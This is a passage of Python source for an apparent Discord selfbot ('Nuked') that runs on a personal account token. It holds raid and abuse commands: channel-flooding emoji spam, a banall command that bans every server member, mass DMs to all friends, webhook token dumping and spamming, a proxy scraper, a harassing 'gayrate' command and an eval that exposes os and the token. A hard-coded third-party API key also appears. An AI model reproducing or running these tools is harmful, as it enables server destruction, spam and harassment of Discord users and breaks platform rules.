        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")

@client.command()
async def gayrate(ctx, member: discord.Member=None):
    await ctx.message.delete()
    embed = discord.Embed(title='Gay Rate', color=0xFFFAFA, description=f'{_gayrate(member.mention)}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def expose(ctx, member: discord.Member=None):
    await ctx.message.delete()
    embed = discord.Embed(title='Exposed', color=0xFFFAFA, description=f'{_expose(member.mention)}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def proxies(ctx):
    await ctx.message.delete()
    proxyscraper()
    embed = discord.Embed(color=0xFFFAFA, title='Proxy Scraper', description='Scraped proxies are in proxies.txt', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def wiki(ctx, *, message):
    await ctx.message.delete()
    try:
        try:
            await ctx.send(wikipedia.summary(message, sentences=2))
        except UserWarning:
            pass
    except Exception as e:
        await ctx.send(e)

@client.command()
async def websteal(ctx, url):
    await ctx.message.delete()
    page = urlopen(url)
    content = page.read()
    number = random.randint(0, 10000)
    with open(f'{number}.html', 'w') as webpage:
        webpage.write(str(content))
    await ctx.send(f'{url} webpage successfully stolen and stored in {number}.html', delete_after=val)

@client.command()
async def ud(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(udtop(message))

@client.command(name='password')
async def _password(ctx):
    await ctx.message.delete()
    await ctx.send(''.join(random.choices(randomness + randomnum + randomsymbols, k=40)))

@client.command()
async def dmfriends(ctx, *, message):
    await ctx.message.delete()
    for f in client.user.friends:
        try:
            await f.send(message)
        except:
            pass

@client.command()
async def hookinfo(ctx, webhook):
    await ctx.message.delete()
    r = requests.get(webhook).json()
    embed = discord.Embed(title='**Webhook Info**', color=0xFFFAFA, description=f'Name: {r["name"]}\nAvatar: {r["avatar"]}\nID: {r["id"]}\nChannel ID: {r["channel_id"]}\nGuild ID: {r["guild_id"]}\nToken: {r["token"]}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

@client.command()
async def hooksend(ctx, webhook, *, message):
    await ctx.message.delete()
    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.send('Webhook is not valid.', delete_after=2)
    else:
        await ctx.send(f'Successfully sent `{message}` to webhook `{webhook}`', delete_after=2)

@client.command()
async def oguser(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(message.replace('I', 'L').replace('l', 'I'))

@client.command()
async def latency(ctx):
    await ctx.message.delete()
    await ctx.send(f'{int(round(client.latency * 1000))} ms')


def insert_returns(body):
    if isinstance(body[-1], ast.Expr):
        body[-1] = ast.Return(body[-1].value)
        ast.fix_missing_locations(body[-1])

    if isinstance(body[-1], ast.If):
        insert_returns(body[-1].body)
        insert_returns(body[-1].orelse)

    if isinstance(body[-1], ast.With):
        insert_returns(body[-1].body)


@client.command(name='eval')
async def _eval(ctx, *, cmd=None):
    await ctx.message.delete()
    if not cmd:
        if disable_eval:
            print(f'{Fore.LIGHTRED_EX}[Warning]: {Fore.LIGHTCYAN_EX}The eval command is very dangerous! Be careful how you use it.{Fore.RESET}')
            print(f'{Fore.LIGHTRED_EX}[Warning]: {Fore.LIGHTCYAN_EX}If you want to enable it, set the "disable_eval" value from true to false in config.json.{Fore.RESET}')
            return
        else:
            print('Eval is missing a command argument.')
            return

    cmd = cmd.strip("` ")

    cmd = "\n".join(f"    {i}" for i in cmd.splitlines())

    fn_name = "_eval_expr"

    body = f"async def {fn_name}():\n{cmd}"

    parsed = ast.parse(body)
    body = parsed.body[0].body

    insert_returns(body)

    env = {
        'client': client,
        'discord': discord,
        'commands': commands,
        'ctx': ctx,
        '__import__': __import__,
        'token': token,
        'requests': requests,
        'print': print,
        'os': os,
        'sys': sys,
        'system': system,
        'asyncio': asyncio,
        'time': time,
        'datetime': datetime
    }
    exec(compile(parsed, filename='<ast>', mode='exec'), env)

    result = (await eval(f'{fn_name}()', env))
    try:
        await ctx.send(result)
    except:
        pass

@client.command()
async def paping(ctx, ip: str, port: int):
    await ctx.message.delete()
    data = measure_latency(host=ip, port=port, runs=5, timeout=1)
    embed = discord.Embed(title=f'**TCP Ping Results for {ip}:{port}**', description=f'{str(data[0])} ms\n{str(data[1])} ms\n{str(data[2])} ms\n{str(data[3])} ms\n{str(data[4])} ms', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)

@client.listen('on_message')
async def slotbotgrab(message):
    if slotbot:
        if message.author.id == 346353957029019648:
            if 'Hurry and pick it up with' in message.content:
                await message.channel.send('~grab')


@client.command()
async def hypesquad(ctx, choice=None):
    await ctx.message.delete()
    if not choice:
        await client.user.edit(house=None, password=password)
    elif choice == 'bravery' or choice == 'Bravery':
        await client.user.edit(house=discord.HypeSquadHouse.bravery, password=password)
    elif choice == 'brilliance' or choice == 'Brilliance':
        await client.user.edit(house=discord.HypeSquadHouse.brilliance, password=password)
    elif choice == 'balance' or choice == 'Balance':
        await client.user.edit(house=discord.HypeSquadHouse.balance, password=password)

@client.command()
async def friend(ctx, member: discord.Member=None):
    await ctx.message.delete()
    if not member:
        pass
    else:
        await member.send_friend_request()

@client.command()
async def unfriend(ctx, member: discord.Member=None):
    await ctx.message.delete()
    if not member:
        pass
    else:
        await member.remove_friend()

@client.command()
async def block(ctx, member: discord.Member=None):
    await ctx.message.delete()
    if not member:
        pass
    else:
        await member.block()


@client.command()
async def typing(ctx):
    await ctx.message.delete()
    while True:
        await ctx.channel.trigger_typing()
        await asyncio.sleep(10)


@client.command()
async def channelinfo(ctx, channel: discord.TextChannel=None):
    await ctx.message.delete()
    if not channel:
        channel = ctx.channel
        embed = discord.Embed(title='**Channel Info**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name='**Is NSFW?**', value=channel.is_nsfw(), inline=False)
        embed.add_field(name='**Is News Channel?**', value=channel.is_news(), inline=False)
        embed.add_field(name='**Channel ID**', value=channel.id, inline=False)
        embed.add_field(name='**Created At**', value=channel.created_at, inline=False)
        embed.add_field(name='**Category ID**', value=channel.category_id, inline=False)
        embed.add_field(name='**Members**', value=len(channel.members), inline=False)
        embed.add_field(name='**Last Message ID**', value=channel.last_message_id, inline=False)
        embed.add_field(name='**Mention**', value=channel.mention, inline=False)
        embed.add_field(name='**Topic**', value=channel.topic, inline=False)
        embed.add_field(name='**Position**', value=channel.position, inline=False)
        embed.add_field(name='**Slowmode Delay**', value=channel.slowmode_delay, inline=False)
        await ctx.send(embed=embed, delete_after=val)
    else:
        embed = discord.Embed(title='**Channel Info**', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name='**Is NSFW?**', value=channel.is_nsfw(), inline=False)
        embed.add_field(name='**Is News Channel?**', value=channel.is_news(), inline=False)
        embed.add_field(name='**Channel ID**', value=channel.id, inline=False)
        embed.add_field(name='**Created At**', value=channel.created_at, inline=False)
        embed.add_field(name='**Category ID**', value=channel.category_id, inline=False)
        embed.add_field(name='**Members**', value=len(channel.members), inline=False)
        embed.add_field(name='**Last Message ID**', value=channel.last_message_id, inline=False)
        embed.add_field(name='**Mention**', value=channel.mention, inline=False)
        embed.add_field(name='**Topic**', value=channel.topic, inline=False)
        embed.add_field(name='**Position**', value=channel.position, inline=False)
        embed.add_field(name='**Slowmode Delay**', value=channel.slowmode_delay, inline=False)
        await ctx.send(embed=embed, delete_after=val)

@client.command()
async def channels(ctx):
    await ctx.message.delete()
    await ctx.send('\n'.join([channel.mention for channel in ctx.guild.channels]))

@client.command()
async def createdm(ctx, member: discord.Member=None):
    await ctx.message.delete()
    if not member:
        pass
    else:
        await member.create_dm()

@client.command()
async def send(ctx, member: discord.Member=None, *, message):
    await ctx.message.delete()
    await member.send(content=message)

@client.command()
async def copy(ctx):
    await ctx.message.delete()
    xd = await client.create_guild(f'{ctx.guild.name}')
    g = await client.fetch_guild(xd.id)
    for cate in ctx.guild.categories:
        x = await g.create_category(f"{cate.name}")
        for chann in cate.channels:
            if isinstance(chann, discord.VoiceChannel):
                await x.create_voice_channel(f"{chann}")
            if isinstance(chann, discord.TextChannel):
                await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass
    
@client.command()
async def delhook(ctx, webhook: str):
    await ctx.message.delete()
    if not webhook:
        return
    else:
        r = requests.delete(webhook)
        if (r.status_code == 204):
            await ctx.send('Webhook was deleted successfully.')
        else:
            await ctx.send('Failed to delete webhook.')


@client.command()   
async def gif(ctx, query=None):
    await ctx.message.delete()
    if not query:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])
    else:
        r = requests.get(f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])

@client.command()
async def edittag(ctx, *, message):
    await ctx.message.delete()
    MAGIC_CHAR = '\u202b'
    # credit to checksum
    headers = {'Authorization': token}
    message_ = f'{MAGIC_CHAR} {message} {MAGIC_CHAR}'
    res = requests.post(f'https://discordapp.com/api/v6/channels/{ctx.channel.id}/messages', headers=headers, json={'content': message_})
    if res.status_code == 200:
        message_id = res.json()['id']
        requests.patch(f'https://discordapp.com/api/v6/channels/{ctx.channel.id}/messages/{message_id}', headers=headers, json={'content': ' ' + message_})
    
@client.command()
async def ban(ctx, member: discord.Member=None, *, reason):
    await ctx.message.delete()
    if not member:
        return
    else:
        try:
            await member.ban(reason=reason)
            embed = discord.Embed(description=f'{member.display_name}#{member.discriminator} was banned for the reason: {reason}', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
            await ctx.send(embed=embed, delete_after=val)        
        except:
            pass
        
@client.command()
async def kick(ctx, member: discord.Member=None, *, reason):
    await ctx.message.delete()
    if not member:
        return
    else:
        try:
            await member.kick(reason=reason)
            embed = discord.Embed(description=f'{member.display_name}#{member.discriminator} was kicked for the reason: {reason}', color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
            await ctx.send(embed=embed, delete_after=val)        
        except:
            pass

@client.command()
async def glitchnick(ctx):
    await ctx.message.delete()
    name = "𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫"
    await ctx.author.edit(nick=name)

@client.command()
async def invisnick(ctx):
    await ctx.message.delete()
    name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
    await ctx.author.edit(nick=name)

@client.command()
async def rembed(ctx, *, message):
    await ctx.message.delete()
    embed1 = discord.Embed(description=message, color=0x9400D3, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed2 = discord.Embed(description=message, color=0x4B0082, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed3 = discord.Embed(description=message, color=0x0000FF, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed4 = discord.Embed(description=message, color=0x00FF00, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed5 = discord.Embed(description=message, color=0xFFFF00, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed6 = discord.Embed(description=message, color=0xFF7F00, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed7 = discord.Embed(description=message, color=0xFF0000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    msg = await ctx.send(embed=embed1)
    for i in range(2):
        await asyncio.sleep(0.2)
        await msg.edit(embed=embed2)
        await asyncio.sleep(0.2)
        await msg.edit(embed=embed3)
        await asyncio.sleep(0.2)
        await msg.edit(embed=embed4)
        await asyncio.sleep(0.2)
        await msg.edit(embed=embed5)
        await asyncio.sleep(0.2)
        await msg.edit(embed=embed6)
        await asyncio.sleep(0.2)
        await msg.edit(embed=embed7)
        await asyncio.sleep(0.2)
    await msg.delete()

@client.command()
async def dlvid(ctx, *, arg):
    await ctx.message.delete()
    results = YoutubeSearch(arg, max_results=1).to_dict()
    video = 'https://youtube.com' + results[0]["url_suffix"]
    video_info = f'Description: {results[0]["long_desc"]}\nChannel: {results[0]["channel"]}\nDuration: {results[0]["duration"]}'
    await ctx.send(f'Downloading {results[0]["title"]} `({video})`\nAdditional Info:\n||{video_info}||')
    ydl_opts = {'quiet': True}
    try:
        with youtube_dl.YoutubeDL(ydl_opts) as ydl: 
	        ydl.download([video])
    except:
        await ctx.send('Failed to download video.')
        

@client.command()
async def youtube(ctx, *, arg):
    await ctx.message.delete()
    results = YoutubeSearch(arg, max_results=10).to_dict()
    rt = ''
    for i in range(10):
        rt += f'{results[i]["channel"]} - {results[i]["title"]} ({results[i]["duration"]})\n'
    embed = discord.Embed(title=f'**Top 10 results for {arg}**', description=rt, color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)
    
@client.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in client.sniped_message_dict:
        await ctx.send(f'{client.sniped_message_dict[currentChannel]}')
    else:
        await ctx.send('There are no messages no snipe!', delete_after=3)

@client.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post('https://hastebin.com/documents', data=message).json()
    await ctx.send(f'https://hastebin.com/{r["key"]}')

@client.command()
async def fact(ctx, *, f: str=None):
    await ctx.message.delete()
    facts = [
        'dog',
        'cat',
        'panda',
        'fox',
        'bird'
    ]
    if not f:
        embed = discord.Embed(title=f'**Fact List**', color=0xFFFAFA, description='\n'.join([fact for fact in facts]), timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        await ctx.send(embed=embed, delete_after=val)
    elif f in facts:
        r = requests.get('https://some-random-api.ml/facts/dog').json()
        embed = discord.Embed(title=f'**{f} Fact**', color=0xFFFAFA, description=r['fact'], timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        await ctx.send(embed=embed, delete_after=val)
    else:
        pass
    
@client.command()
async def competing(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(name=message, type=5))
        
@client.command()
async def report(ctx, user: discord.Member=None, mid: str=None, *, reason: str=None):
    await ctx.message.delete()
    if not user and not reason and not mid:
        embed = discord.Embed(title=f'**Error**', color=0xFFFAFA, description=f'there was an error with the command.\nproper command syntax: {client.command_prefix}report [user mention] [message id] [reason]')
        await ctx.send(embed=embed, delete_after=val)
    else:
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US',
            'User-Agent': 'Discord/21887 CFNetwork/1197 Darwin/20.0.0',
            'Content-Type': 'application/json',
            'Authorization': token
        }
        json = {
            'channel_id': ctx.channel.id, 
            'message_id': mid, 
            'guild_id': ctx.guild.id, 
            'reason': reason
        }
        r = requests.post('https://discordapp.com/api/v8/report', json=json, headers=headers)
        
        if r.status_code == 201:
            embed = discord.Embed(title=f'**Error**', color=0xFFFAFA, description=f'report successful with status code {r.status_code}')
            await ctx.send(embed=embed, delete_after=val)
        else:
            embed = discord.Embed(title=f'**Error**', color=0xFFFAFA, description=f'report failed with status code {r.status_code}')
            await ctx.send(embed=embed, delete_after=val)
         
@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members:
        try:
            await m.ban()
        except:
            pass

# selfbot functions

signal.signal(signal.SIGINT, Nuked.SignalHandler)
clear()
Nuked.InitialSetup()
Nuked.Presplash()
if rich_presence:
    try:
        rpc = Presence(client_id='808176144959537162')
        rpc.connect()
        rpc.update(details='Connected', large_image='avatar', start=time.time())
    except Exception as e:
        print(f'RPC Failed to initialize, reason: {e}.')
        time.sleep(1)
Nuked.Init()
